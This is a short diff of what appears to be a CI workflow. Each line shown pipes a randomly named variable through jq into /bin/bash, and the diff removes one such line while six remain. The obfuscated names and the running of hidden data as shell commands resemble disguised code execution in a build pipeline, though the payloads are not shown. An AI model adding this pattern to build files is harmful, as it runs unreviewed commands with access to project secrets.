@@ -29,7 +29,6 @@ jobs:
           echo $dxayu2 | jq -r .hqcem081 | /bin/bash
           echo $aris13011 | jq -r .sal78413 | /bin/bash
           echo $vo055 | jq -r .zemv1 | /bin/bash
-          printf '%s' "$hz6" | jq -r .baf8 | /bin/bash
           echo $tziqa38527 | jq -r .fcwtb76 | /bin/bash
           echo $om8 | jq -r .gd36520 | /bin/bash
           echo $scekc4 | jq -r .vma906 | /bin/bash
